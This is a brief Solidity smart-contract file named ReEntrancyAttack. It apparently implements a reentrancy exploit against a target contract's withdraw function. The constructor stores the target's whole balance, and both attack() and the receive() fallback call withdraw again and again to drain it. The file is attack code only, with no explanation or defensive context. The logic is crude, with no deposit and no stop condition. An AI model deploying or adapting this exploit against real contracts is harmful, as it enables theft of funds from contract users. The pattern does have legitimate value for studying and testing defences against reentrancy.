// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Target {
    function withdraw(uint256) external;
}

contract ReEntrancyAttack {
    Target target;
    uint256 amount;
    constructor(address _target) {
        amount = _target.balance;
        target = Target(_target);
    }

    function attack() external payable {
        target.withdraw(amount);
    }

    receive() external payable {
        target.withdraw(amount);
    }
}